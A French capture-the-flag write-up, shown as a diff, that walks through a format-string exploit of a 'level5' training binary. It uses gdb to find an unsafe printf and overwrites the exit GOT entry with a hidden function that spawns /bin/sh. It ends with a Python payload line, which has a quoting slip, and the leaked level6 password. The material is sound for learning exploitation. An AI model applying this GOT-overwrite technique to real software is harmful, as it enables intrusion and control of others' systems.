@@ -1,0 +1,99 @@
+On a un fichier binaire qui ouvre le stdin puis réecrit ce qu'on a mis dans le stdout.
+Quand on l'observe avec gdb, on peut voir que le programme appelle une fonction n. Cette fonctions n fait un gets,
+puis un printf non protégé par un systeme de parsage, puis exit:
+(gdb) disas n
+   ...
+   0x080484e2 <+32>:	mov    %eax,(%esp)
+   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
+   0x080484f0 <+46>:	mov    %eax,(%esp)
+   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
+   0x080484f8 <+54>:	movl   $0x1,(%esp)
+   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+   ...
+
+
+Comme on a que notre printf pour nous aider a faire cette exploit, on va essayer de rediriger notre printf vers un appel system.
+On cherche donc l'addresse de l'appelle system:
+(gdb) p system
+    $1 = {<text variable, no debug info>} 0x80483b0 <system@plt>
+Surprise ce n'est pas l'addresse du system de la libc qui m'est renvoyé, et qui aurait du commencé par 0xb, mais une fonction systeme du programme qui se chache qq part, et n'aurait pas du avoir d'argument @plt.
+On cherche donc plus d'informations:
+
+(gdb) info functions
+    ...
+    0x08048390  _exit@plt
+    0x080483a0  fgets
+    0x080483a0  fgets@plt
+    0x080483b0  system
+    0x080483b0  system@plt
+    0x080483d0  exit
+    0x080483d0  exit@plt
+    0x08048480  frame_dummy
+    0x080484a4  o
+    0x080484c2  n
+    0x08048504  main
+    ...
+
+On voit une fonction o inconnu:
+(gdb) disas o
+   0x080484a4 <+0>:	push   %ebp
+   0x080484a5 <+1>:	mov    %esp,%ebp
+   0x080484a7 <+3>:	sub    $0x18,%esp
+   0x080484aa <+6>:	movl   $0x80485f0,(%esp)
+   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
+   0x080484b6 <+18>:	movl   $0x1,(%esp)
+   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
+(gdb) x/s 0x80485f0
+    0x80485f0:	 "/bin/sh"
+
+Bingo, dans notre fonction o se cache un appelle system qui prend directement "/bin/sh" en argument.
+Il faut donc trouver le moyen d'executer la fonction o grace à notre printf.
+Mais juste après notre printf, il y a un exit ce qui clos le programme. Il n'y a pas de return.
+Le seul moyen est donc d'exploiter le exit, et donc d'écraser le exit pour le remplacer par notre fonction o.
+Si dans le level précédent on voulait trouver l'addresse de m pour lui donner la valeur 54, ici on va plutôt chercher l'addresse de exit pour lui donner
+la valeur de la fonction o, l'addresse de o.
+
+Pour l'addresse de exit, on va directement regarder dans gdb à quoi elle correspond.
+(gdb) disas n
+       0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+On remarque alors que la fonction est suivi de @plt, procedure linkage table. Ce qui signifie que le programme utilise ici un dynamic linkage et que la fonction exit ici fait
+en réalité référence à une autre fonction exit, surement de la libc.
+on voit le call 0x80483d0 et si on regarde ce que cela signifie.
+
+(gdb) x/s 0x80483d0
+    0x80483d0 <exit@plt>:	 "\377%8\230\004\bh("
+En string cela ne veut rien dire mais à en voir les caractère ça ressemble à une instruction en binaire
+(gdb) x/i 0x80483d0  (i pour instruction)
+       0x80483d0 <exit@plt>:	jmp    *0x8049838
+
+Le call à exit veut simplement dire de jump, d'aller à l'addresse 0x8049838 où se trouve donc notre véritable exit, utilisé par la shared librairie.
+On a donc l'addresse de notre exit.
+
+En ce qui concerne l'addresse de o, on a vu dans gdb qu'elle etait a 0x080484a4. Mais comme le modifier de printf n est fait pour mettre une valeur numeraire
+à une addresse donné, on va le convertir en décimal. Ce qui est égale a 134513828. Il faut donc que le n compte 134513828 octets avant lui,
+on utilisera le padding de printf pour éviter le broken pipe et on lui enlevera les 4bytes qui seront déjà rempli par l'addresse de exit.
+
+On trouve enfin la position de notre buffer pour placer l'addresse de exit au bonne enfroit et ensuite pouvoir lui donner la bonne valeur:
+(gdb) disas n
+    ...
+    0x080484f3 <+49>:	call   0x8048380 <printf@plt>
+    ...
+(gdb) b *0x080484f3
+(gdb) run
+(gdb) AAAA
+(gdb) x/20x $sp
+    0xbffff500:	0xbffff510	0x00000200	0xb7fd1ac0	0xb7ff37d0
+    0xbffff510:	0x41414141	0xb7e2000a	0x00000001	0xb7fef305
+    0xbffff520:	0xbffff578	0xb7fde2d4	0xb7fde334	0x00000007
+    0xbffff530:	0x00000000	0xb7fde000	0xb7fff53c	0xbffff578
+    0xbffff540:	0x00000040	0x00000b80	0x00000000	0xb7fde714
+
+on voit que notre 0x41414141 se trouve à la 4e position
+
+
+Ce qui nous donne:
+$ python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824x" + %4$n' > /tmp/exploit5
+$ cat /tmp/exploit5 - | .level5
+    cat /home/user/level6/.pass
+    d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
